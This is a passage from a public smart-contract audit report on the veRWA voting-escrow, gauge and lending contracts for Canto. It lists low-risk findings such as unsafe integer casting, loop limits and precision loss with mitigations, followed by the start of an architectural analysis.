 > This was discovered during the testing contest and fixed before the auditing contest.

**[alcueca (Judge) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/140#issuecomment-1694506064):**
 > @OpenCoreCH, since the warden didn't really submit a report, would you be so kind as to explain the impact of this bug?

**[OpenCoreCH (veRWA) commented](https://github.com/code-423n4/2023-08-verwa-findings/issues/140#issuecomment-1695301408):**
 > The `Math.max` there is an underflow protection for `points_sum[next_time]`. This wrong implementation would have lead to an underflow in some edge cases (`points_sum` is near 0 / low, i.e. there is not a lot of voting power in the system), preventing votes for the user. Because `old_bias` decreases over time (and eventually reaches 0), the error would generally have been recoverable, but it could have taken some time.

***

# Low Risk and Non-Critical Issues

For this audit, 96 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-08-verwa-findings/issues/448) by **RED-LOTUS-REACH** received the top score from the judge.

*The following wardens also submitted reports: [ppetrov](https://github.com/code-423n4/2023-08-verwa-findings/issues/476), [nemveer](https://github.com/code-423n4/2023-08-verwa-findings/issues/474), [aakansha](https://github.com/code-423n4/2023-08-verwa-findings/issues/466), [Raihan](https://github.com/code-423n4/2023-08-verwa-findings/issues/464), [0xkazim](https://github.com/code-423n4/2023-08-verwa-findings/issues/461), [kaden](https://github.com/code-423n4/2023-08-verwa-findings/issues/456), [oakcobalt](https://github.com/code-423n4/2023-08-verwa-findings/issues/445), [popular00](https://github.com/code-423n4/2023-08-verwa-findings/issues/440), [d23e](https://github.com/code-423n4/2023-08-verwa-findings/issues/432), [ni8mare](https://github.com/code-423n4/2023-08-verwa-findings/issues/431), [jat](https://github.com/code-423n4/2023-08-verwa-findings/issues/428), [Eeyore](https://github.com/code-423n4/2023-08-verwa-findings/issues/422), [nonseodion](https://github.com/code-423n4/2023-08-verwa-findings/issues/417), [0xDetermination](https://github.com/code-423n4/2023-08-verwa-findings/issues/414), [0xhacksmithh](https://github.com/code-423n4/2023-08-verwa-findings/issues/406), [Shubham](https://github.com/code-423n4/2023-08-verwa-findings/issues/404), [rjs](https://github.com/code-423n4/2023-08-verwa-findings/issues/397), [klau5](https://github.com/code-423n4/2023-08-verwa-findings/issues/380), [AlexCzm](https://github.com/code-423n4/2023-08-verwa-findings/issues/372), [sandy](https://github.com/code-423n4/2023-08-verwa-findings/issues/363), [Watermelon](https://github.com/code-423n4/2023-08-verwa-findings/issues/360), [QiuhaoLi](https://github.com/code-423n4/2023-08-verwa-findings/issues/358), [auditsea](https://github.com/code-423n4/2023-08-verwa-findings/issues/335), [14si2o\_Flint](https://github.com/code-423n4/2023-08-verwa-findings/issues/320), [merlin](https://github.com/code-423n4/2023-08-verwa-findings/issues/317), [deadrxsezzz](https://github.com/code-423n4/2023-08-verwa-findings/issues/313), [Deekshith99](https://github.com/code-423n4/2023-08-verwa-findings/issues/305), [immeas](https://github.com/code-423n4/2023-08-verwa-findings/issues/291), [windhustler](https://github.com/code-423n4/2023-08-verwa-findings/issues/272), [owadez](https://github.com/code-423n4/2023-08-verwa-findings/issues/259), [supervrijdag](https://github.com/code-423n4/2023-08-verwa-findings/issues/253), [KmanOfficial](https://github.com/code-423n4/2023-08-verwa-findings/issues/246), [carlos\_\_alegre](https://github.com/code-423n4/2023-08-verwa-findings/issues/242), [hunter\_w3b](https://github.com/code-423n4/2023-08-verwa-findings/issues/234), [kutugu](https://github.com/code-423n4/2023-08-verwa-findings/issues/217), [0x3b](https://github.com/code-423n4/2023-08-verwa-findings/issues/216), [MatricksDeCoder](https://github.com/code-423n4/2023-08-verwa-findings/issues/214), [castle\_chain](https://github.com/code-423n4/2023-08-verwa-findings/issues/207), [Bughunter101](https://github.com/code-423n4/2023-08-verwa-findings/issues/204), [Rolezn](https://github.com/code-423n4/2023-08-verwa-findings/issues/181), [0xCiphky](https://github.com/code-423n4/2023-08-verwa-findings/issues/175), [0xDING99YA](https://github.com/code-423n4/2023-08-verwa-findings/issues/172), [ayden](https://github.com/code-423n4/2023-08-verwa-findings/issues/162), [0x4non](https://github.com/code-423n4/2023-08-verwa-findings/issues/159), [MrPotatoMagic](https://github.com/code-423n4/2023-08-verwa-findings/issues/154), [audityourcontracts](https://github.com/code-423n4/2023-08-verwa-findings/issues/146), [ladboy233](https://github.com/code-423n4/2023-08-verwa-findings/issues/144), [Alhakista](https://github.com/code-423n4/2023-08-verwa-findings/issues/139), [imkapadia](https://github.com/code-423n4/2023-08-verwa-findings/issues/107), [InAllHonesty](https://github.com/code-423n4/2023-08-verwa-findings/issues/90), [leasowillow](https://github.com/code-423n4/2023-08-verwa-findings/issues/80), [Strausses](https://github.com/code-423n4/2023-08-verwa-findings/issues/78), [HChang26](https://github.com/code-423n4/2023-08-verwa-findings/issues/68), [\_eperezok](https://github.com/code-423n4/2023-08-verwa-findings/issues/67), [erebus](https://github.com/code-423n4/2023-08-verwa-findings/issues/51), [deth](https://github.com/code-423n4/2023-08-verwa-findings/issues/44), [T1MOH](https://github.com/code-423n4/2023-08-verwa-findings/issues/39), [thekmj](https://github.com/code-423n4/2023-08-verwa-findings/issues/37), [RHaO-sec](https://github.com/code-423n4/2023-08-verwa-findings/issues/14), [kaveyjoe](https://github.com/code-423n4/2023-08-verwa-findings/issues/13), [JP\_Courses](https://github.com/code-423n4/2023-08-verwa-findings/issues/447), [Naubit](https://github.com/code-423n4/2023-08-verwa-findings/issues/436), [tay054](https://github.com/code-423n4/2023-08-verwa-findings/issues/434), [wahedtalash77](https://github.com/code-423n4/2023-08-verwa-findings/issues/413), [halden](https://github.com/code-423n4/2023-08-verwa-findings/issues/385), [Mike\_Bello90](https://github.com/code-423n4/2023-08-verwa-findings/issues/382), [Tripathi](https://github.com/code-423n4/2023-08-verwa-findings/issues/377), [sl1](https://github.com/code-423n4/2023-08-verwa-findings/issues/371), [lanrebayode77](https://github.com/code-423n4/2023-08-verwa-findings/issues/351), [0xStalin](https://github.com/code-423n4/2023-08-verwa-findings/issues/308), [devival](https://github.com/code-423n4/2023-08-verwa-findings/issues/285), [Bube](https://github.com/code-423n4/2023-08-verwa-findings/issues/274), [p\_crypt0](https://github.com/code-423n4/2023-08-verwa-findings/issues/271), [0xG0P1](https://github.com/code-423n4/2023-08-verwa-findings/issues/267), [markus\_ether](https://github.com/code-423n4/2023-08-verwa-findings/issues/257), [cducrest](https://github.com/code-423n4/2023-08-verwa-findings/issues/243), [zhaojie](https://github.com/code-423n4/2023-08-verwa-findings/issues/161), [0xmuxyz](https://github.com/code-423n4/2023-08-verwa-findings/issues/160), [ch0bu](https://github.com/code-423n4/2023-08-verwa-findings/issues/152), [0xbrett8571](https://github.com/code-423n4/2023-08-verwa-findings/issues/131), [lsaudit](https://github.com/code-423n4/2023-08-verwa-findings/issues/125), [SUPERMAN\_I4G](https://github.com/code-423n4/2023-08-verwa-findings/issues/113), [matrix\_0wl](https://github.com/code-423n4/2023-08-verwa-findings/issues/106), [Topmark](https://github.com/code-423n4/2023-08-verwa-findings/issues/94), [Giorgio](https://github.com/code-423n4/2023-08-verwa-findings/issues/92), [0xE1](https://github.com/code-423n4/2023-08-verwa-findings/issues/89), [hassan-truscova](https://github.com/code-423n4/2023-08-verwa-findings/issues/74), [0xweb3boy](https://github.com/code-423n4/2023-08-verwa-findings/issues/50), [fatherOfBlocks](https://github.com/code-423n4/2023-08-verwa-findings/issues/42), [Silverskrrrt](https://github.com/code-423n4/2023-08-verwa-findings/issues/35), [0xWaitress](https://github.com/code-423n4/2023-08-verwa-findings/issues/23), [koxuan](https://github.com/code-423n4/2023-08-verwa-findings/issues/18), [piyushshukla](https://github.com/code-423n4/2023-08-verwa-findings/issues/11), [pipidu83](https://github.com/code-423n4/2023-08-verwa-findings/issues/9), and [hpsb](https://github.com/code-423n4/2023-08-verwa-findings/issues/5).*

## [01] Casting between types makes values negative for huge input values

Invariants to the VotingEscrow contract can be broken.  While an enormous quantity is necessary, greater than the total supply of `$CANTO`, it’s worth mentioning due to the fact that invariants in the system can be broken, if only in testing environments.

Invariants affected in `VotingEscrow.sol`:

- `LockedBalance.delegated` must always be > 0
    - can be made negative
- `LockedBalance.amount` must always be > 0
    - can be made negative
- `Point.slope` must always be ≥ 0
    - can be made negative
- `Point.bias` must always be ≥ 0
    - can be made negative

Cases in `VotingEscrow.sol` where casting creates vulnerable attack surfaces:

- From increaseAmount in VotingLock.sol, line 317:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317) 

```solidity
newLocked.delegated += int128(int256(_value));
```

- From increaseAmount in VotingLock.sol, line 305:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L305](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L305)

```solidity
newLocked.delegated += int128(int256(_value));
```

- From createLock in VotingLock.sol, line 276:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L276](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L276)

```solidity
locked_.amount += int128(int256(_value));
```

- From createLock in VotingLock.sol, line 278:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L278](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L278)

```solidity
locked_.delegated += int128(int256(_value));
```

- From increaseAmount in VotingLock.sol, line 300:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L300](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L300)

```solidity
newLocked.amount += int128(int256(_value));
```

- From increaseAmount in VotingLock.sol, line 317:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L317)

```solidity
newLocked.delegated += int128(int256(_value));
```

### Risk

Debugging and auditing this code is made more complex due to the inclusion of this casting, which puts the protocol more at risk than had they been unused.

It's not fully clear why the types for `amount` and `delegated`  of the `LockedBalance` struct are of type `int128`.  This could introduce unforseen edge cases due to the copious casting.  All assignments from function arguments are of type `uint256` (coming from `createLock()` and `increaseAmount()`), making the usage more peculiar and inconsistent. Similarly, `int128` is used for `bias` and `slope` of the `Point` struct, and in all places where they are used for calculations, they must be checked for being negative and are subsequently reset to `0` in the case of being negative. The suspicion is that since the origin of the `ve` system came from the original Curve contracts, the implicit assumptions of that system were kept wholesale.

### Mitigation

Use unsigned integers for all financial calculations so that all casting is removed and remove the subsequent unnecessary "resets" to `0`. Instead, for places where the "resets" are used, define pre-conditions  that ensure negative-valued outcomes are not permissible in calls to `createLock()` and `increaseLock()`.

## [02] Bias and slope can be made negative with huge deposits thus manipulating total voting power

Similar to the previous “Casting between types makes values negative for huge input values”, huge inputs can allow for attacks on the protocol, if only in a testing environment.  

In `VotingEscrow.sol` the code in question is from `_checkpoint()`, lines 129 - 136:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L129-L136](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L129-L136)

```solidity
// When a huge deposit is made, the casting of _value in createLock can allow delegated to overflow into negative a value...
if (_oldLocked.end > block.timestamp && _oldLocked.delegated > 0) {
    // ...these can become negative as a result
    userOldPoint.slope = _oldLocked.delegated / int128(int256(LOCKTIME));
    userOldPoint.bias = userOldPoint.slope * int128(int256(_oldLocked.end - block.timestamp));
}
if (_newLocked.end > block.timestamp && _newLocked.delegated > 0) {
    // ...these can become negative as a result
    userNewPoint.slope = _newLocked.delegated / int128(int256(LOCKTIME));
    userNewPoint.bias = userNewPoint.slope * int128(int256(_newLocked.end - block.timestamp));
}
```

### Risk

Control over the sign of `bias` and `slope` allows for the control of decay of voting power, because at any point they become < 0, they are reset to 0, giving the theoretical attacker the ability to temporarily stem the decay of their voting power.

### Mitigation

Similar to “Casting between types makes values negative for huge input values”, bypass the need to cast (and automatically hard-lock values to 0) by using unsigned types with guards for relevant pre-conditions that ensure negative-valued outcomes are not permissible in calls to `createLock()` and `increaseLock()`.

## [03] Inconsistent Lock Durations

Locks for veRWA are set for 5 years, given no further actions on a lock are performed.  This 5 year period is an important duration, because it also determines the calculations for the decay in voting power a lock has.  In `**VotingEscrow.sol**`, the 5 year lock period is measured as 1825 days.  

Places where the 1785 day measurement is used:

- in `_checkpoint()`, line 185

```solidity
for (uint256 i = 0; i < 255; i++) {
	iterativeTime = iterativeTime + WEEK; 

	...

	if (iterativeTime == block.timestamp) {
	    lastPoint.blk = block.number;
	    break;
	} ...
}
```

- in `_supplyAt()`, line 538

```solidity
function _supplyAt(..., uint256 _t) ... {
	for (uint256 i = 0; i < 255; i++) {
		iterativeTime = iterativeTime + WEEK; 
	
		...
	
		if (iterativeTime == _t) {
		    break;
		}
	}
}
```

### Risk

There is a possibility that the protocol faces a case where locked funds are untouched and no new funds are locked across  a 5 year period.  In this “last users standing” scenario, the protocol theoretically is still responsible for calculating the final voting weights, allowing investors to maximize the utility of their locked funds regardless of the relevancy of the protocol.

Surprisingly, the maximum span the protocol can actually measure is less than 5 years, it is 255 weeks, which equates to 1785 days.  For those final 40 days and afterwards, for example, weights will be miscalculated, and, especially depending on the size of the funds locked, returns on those funds or supply totals will be miscalculated.

### Mitigation

Increase the number of iterations to fully calculate weights through the 5 year period.

## [04] Unnecessary Modifiers Cost Gas

Reentrancy is a common root-cause for exploits in smart contracts.  To avoid the specific case of basic reentrancy, a `nonReentrant` modifier is often used.  In the case of a handful of functions in **`VotingEscrow.sol`,** this modifier is unnecessary, because the cause of reentrancy - calling into external contracts - is also missing.  While they are not a risk, they do cause extra computation, and thus raise gas costs, which may be of some notice especially during high network congestion.

Locations where they exist:

- Line 268:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L268](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L268)

```solidity
function createLock(uint256 _value) external payable nonReentrant {
```

- Line 288:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L288](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L288)

```solidity
function increaseAmount(uint256 _value) external payable nonReentrant {
```

- Line 326:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L326C5-L326](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L326C5-L326C48)

```solidity
function withdraw() external nonReentrant {
```

- Line 356:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L356](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L356)

```solidity
function delegate(address _addr) external nonReentrant {
```

### Risk

No identified risk, since no external contract calls are made in these functions. However there is the cost of computation from running the modifiers during each call, thus increasing gas costs.

### Mitigation

Remove the modifiers from the function definitions.

## [05] Many cases of precision loss from multiply-after-divide

While there wasn’t enough time to explore possible attack vectors for these cases, it’s apparent that there is definite loss in precision while calculating important values in the system.  

- From `_checkpoint()` in `VotingEscrow.sol`, lines 129 - 132:

[https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L129-L132](https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L129-L132)

```solidity
if (_oldLocked.end > block.timestamp && _oldLocked.delegated > 0) {
    userOldPoint.slope = _oldLocked.delegated / int128(int256(LOCKTIME));
    userOldPoint.bias = userOldPoint.slope * int128(int256(_oldLocked.end - block.timestamp));
}
```

- From `_checkpoint()` in `VotingEscrow.sol`, lines 133 - 136:

[https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L133-L136](https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L133-L136)

```solidity
if (_newLocked.end > block.timestamp && _newLocked.delegated > 0) {
	userNewPoint.slope = _newLocked.delegated / int128(int256(LOCKTIME));
	userNewPoint.bias = userNewPoint.slope * int128(int256(_newLocked.end - block.timestamp));
}
```

- From `_checkpoint()` in `VotingEscrow.sol`, lines 176 - 218

[https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L176-L218](https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L176-L218)

```solidity
uint256 blockSlope = 0; // dblock/dt
if (block.timestamp > lastPoint.ts) {
    blockSlope = (MULTIPLIER * (block.number - lastPoint.blk)) / (block.timestamp - lastPoint.ts);
}

// Go over weeks to fill history and calculate what the current point is
uint256 iterativeTime = _floorToWeek(lastCheckpoint);
for (uint256 i = 0; i < 255; i++) {
     ...

    // PRECISION LOSS HERE: blockslope was originally calculated w/ a division, now it's multiplied further
    lastPoint.blk = initialLastPoint.blk + (blockSlope * (iterativeTime - initialLastPoint.ts)) / MULTIPLIER;

     ...
}
```

- From `_checkpoint_lender()` in LendingLedger.sol, line 60:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L60](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L60)

```solidity
uint256 currEpoch = (block.timestamp / WEEK) * WEEK;
```

### Risk

Precision loss in critical calculations can make the risk/reward for investors less appealing.  In critical cases there could be possible losses involved when these discrepancies are exploited.

### Mitigation

Reorder operations to ensure division happens before multiplication in the listed instances.

## [06] Inconsistent Use of NatSpec

NatSpec is a boon to all Solidity developers. Not only does it provide a structure for developers to document their code within the code itself, it encourages the practice of documenting code. When future developers read code documented with NatSpec, they are able to increase their capacity to understand, upgrade, and fix code. Without code documented with NatSpec, that capacity is hindered.

The veRWA codebase does have a high level of documentation with NatSpec. However there are numerous instances of functions missing NatSpec.

### Risks

1. Lack of understanding of code without adequate documentation.
2. Difficulty in understanding, upgrading, and fixing code without documentation.

### Recommendation

1. Practice consistent use of NatSpec on all parts of the project codebase.
2. Include the need for NatSpec comments for code reviews to pass.

## [07] Old version of OpenZeppelin Contracts used

Using old versions of 3rd-party libraries in the build process can introduce vulnerabilities to the protocol code. 

- Latest is 4.9.3 (as of July 28, 2023), version used in project is 4.9.2

### Risks

1. Older versions of OpenZeppelin contracts might not have fixes for known security vulnerabilities.
2. Older versions might contain features or functionality that have been deprecated in recent versions.
3. Newer versions often come with new features, optimizations, and improvements that are not available in older versions.

### Recommendation

Review the latest version of the OpenZeppelin contracts and upgrade

## [08] Error Messages don’t match intent

Meaningful error messages give better handles to test against. While building a test suite, edge cases can become numerous, and providing descriptive error messages allows not just for the project developers to write better tests, it helps developers of 3rd-party integrations and forks (other protocols, token projects, etc) to understand the intentions and reasoning of the parent project.

In the veRWA codebase, there are places where the error cases are materially different from the guards they are included with. 

- From `VotingEscrow.sol`, line 573:

[https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L573](https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L573)

```solidity
require(_blockNumber <= block.number, "Only past block number"); //Should be “Only before block number”
```

### Risk

1. Project developers get the wrong understanding of why a case is erroneous.
2. Writing tests for specific error types becomes difficult because of a lack of unique errors provided by the executed code.
3. 3rd-party developers (forks, integrations) can have difficulties understanding developer intentions.

### Recommendation

Use more descriptive handler names and error messages and limit reusing error messages for categorically-similar-yet-different errors.

## [09] Function Names don’t match intent

`totalSupply`, `totalSupplyAt`, `supplyAt` in `VotingEscrow.sol` refer to voting power, not locked supply.  This causes confusion to developers or auditors onboarding to the codebase.

## [10] Dead Code

In many cases, dead code can create attack surfaces for malicious exploits. In the case for `VotingEscrow.sol`, there are instances of dead and unused code, though the risks are much lower.

### Unused assignment

- From `_checkpoint()` in `VotingEscrow.sol`, line 206:

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L206](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L206)

```solidity
lastCheckpoint = iterativeTime; // <= this is never used
```

### Unused Enums

Ex. VotingEscrow.sol, line 62 and 64

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L62](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L62)

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L64](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L64)

```solidity
enum LockAction {
		...
    INCREASE_TIME, // <= never used
    QUIT, // <= never used
		...
}
```

### Risk

While no attack vectors were identified from these instances of dead code, there is a definite increase in gas usage during execution and deployment.

### Mitigation

Remove the instances of dead code from the codebase.

## [11] TODOs included in code/comments

Ex. `LendingLedger.sol`, line 48 and `GaugeController.sol` line 59

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L48](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/LendingLedger.sol#L48)

[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L59](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/GaugeController.sol#L59)

```solidity
governance = _governance; // TODO: Maybe change to Oracle
```

## [12] Reference to non-existent documentation

The references to IVotingEscrow are misleading because there is no IVotingEscrow anywhere in the codebase.  This makes it difficult to trust comments in the codebase, let alone find the referenced documentation that may enlighten the developer or auditor.

Examples: 

- [https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267)
- [https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L2](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267)86
- [https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L267)325
- [https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L355](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L355)
- [https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L472](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L472)[https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L486](https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L486)

***

# Audit Analysis

For this audit, 8 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-08-verwa-findings/issues/446) by **catellatech** received the top score from the judge.

*The following wardens also submitted reports: [rjs](https://github.com/code-423n4/2023-08-verwa-findings/issues/472), [MrPotatoMagic](https://github.com/code-423n4/2023-08-verwa-findings/issues/453), [RED-LOTUS-REACH](https://github.com/code-423n4/2023-08-verwa-findings/issues/452), [0xSmartContract](https://github.com/code-423n4/2023-08-verwa-findings/issues/473), [0x73696d616f](https://github.com/code-423n4/2023-08-verwa-findings/issues/465), [thekmj](https://github.com/code-423n4/2023-08-verwa-findings/issues/215), and [0xbrett8571](https://github.com/code-423n4/2023-08-verwa-findings/issues/138).*

## Description of `veRWA project` 
veRWA is an incentivization mechanism designed for Real World Assets (RWA) on the Canto platform. It operates similarly to the veCRV system with its liquidity gauge. Users have the option to lock up CANTO tokens for a duration of five years in the `VotingEscrow` contract, in exchange for receiving veCANTO tokens. 

Subsequently, they can participate in voting activities within the `GaugeController` for various credit markets that have been whitelisted by the governance. Users who provide liquidity in these credit markets can claim `CANTO` tokens (provided by the CANTO governance) from the `LendingLedger` contract, based on their proportional contribution.

To illustrate, let's consider credit markets X, Y, and Z where Alice, Bob, and Charlie contribute liquidity. In the scenario of credit market X, assuming Alice contributes 60% of the liquidity, Bob contributes 30%, and Charlie contributes 10% at a specific time (epoch), and let's assume that credit market X receives 40% of all votes at that epoch. Consequently, the allocations would be:

- Alice: `40% * 60% = 24%` of all allocated CANTO tokens for this epoch.
- Bob: `40% * 30% = 12%` of all allocated CANTO tokens for this epoch.
- Charlie: `40% * 10% = 4%` of all allocated CANTO tokens for this epoch.

This mechanism aims to incentivize participation and liquidity provision in credit markets backed by real world assets on the Canto platform.

## Summary

![veRWA](https://user-images.githubusercontent.com/98446738/274801777-1ba1f99b-f964-4e2b-9d02-e581fa344770.png)

## 1- Approach we followed when reviewing the code
To begin, we assessed the code's scope, which guided our approach to reviewing and analyzing the project.

### Scope

- **GaugeController.sol**:
    - The `GaugeController` contract is like a translated version of Curve's `GaugeController` written in Solidity. It simplifies the gauge types to just one type for veRWA. This leads to other changes in the code. The way gauges (lending markets) are approved is also different from the original design.

    The controller lets users vote on how much weight a gauge should have in distributing CANTO tokens during a specific period (epoch). It also allows checking the historical relative weights of all gauges.

- **VotingEscrow.sol**: 
    - The `VotingEscrow` system used here is based on an existing setup from FIAT DAO, which itself was built by modifying Curve's original design. In this version, a few changes were made, like allowing the use of native tokens instead of ERC20 tokens. Additionally, a fixed lock time of 5 years was added, which restarts every time an action is taken.

- **LendingLedger.sol**: 
    - The lending ledger keeps track of how much cryptocurrency users have contributed to a specific market over time. To do this, authorized markets need to notify the ledger whenever a user deposits or withdraws funds. The Canto governance manages the rewards by sending CANTO tokens to the contract, controlling the amount allocated for each epoch. 

With this understanding, we proceeded to scrutinize and audit the code through a series of structured steps:

![veRWA](https://user-images.githubusercontent.com/98446738/274802100-30911ef2-a45b-4064-8689-48d7e5310ece.png)

## 2- Analysis of the code base
The **`GaugeController` contract** is a fundamental component of the ``veRWA project`` is responsible for enabling users to vote on the distribution of CANTO tokens and managing information related to weights and changes in "gauges" (credit markets) within the `veRWA project`.

- Here's a breakdown of the key parts of this contract:

![`GaugeController`](https://user-images.githubusercontent.com/98446738/274802223-e7068ba0-e959-4e94-b217-c3801a89e456.png)

The **`VotingEscrow` contract** is responsible for managing users locking and voting power. 

- I'll explain the key components and functionality of the contract in simpler terms:

![`VotingEscrow`](https://user-images.githubusercontent.com/98446738/274802378-ff4f59d6-f089-4a1c-b555-247c1b0f2825.png)

The **`LendingLedger` contract** is responsible for tracking balances and rewards in lending markets. Users can synchronize their balances, claim rewards, and the governance can set rewards and control the whitelist of lending markets.

- Let's delve into its functionality and structure:

![`LendingLedger`](https://user-images.githubusercontent.com/98446738/274802440-67709249-bc61-4c66-84df-249c288b88ce.png)

## 3- Test analysis
The audit scope of the contracts to be audited is 95% and it should be aimed to be 100%.

```
What is the overall line coverage percentage provided by your tests?: 95%
```

### How could they have done it better?
While the provided code seems to be functional, there are always areas for improvement to ensure better security, efficiency, and readability in both the contract and the protocol. 

- Here are some potential areas for improvement:

    1. **Code Comments and Documentation**:
        - The code lacks detailed comments explaining the purpose and functionality of each function. Adding comprehensive comments can help other developers understand the codebase more easily.

    2. **Access Control**:
        - While the contract includes a onlyGovernance modifier for certain functions, it's essential to ensure that access control mechanisms are robust and properly implemented throughout the protocol. Consider using a more standardized access control library for clarity and security.

    3. **Error Handling and Assertions**:
        - The code uses require statements for error checking, which is good. However, more informative error messages could be added to provide better context about what went wrong during transactions.

    4. **Code Organization**:
        - The code could be organized into separate files or contracts for improved modularity and readability. This can make it easier to understand the different components of the protocol.

    5. **Security Audits**:
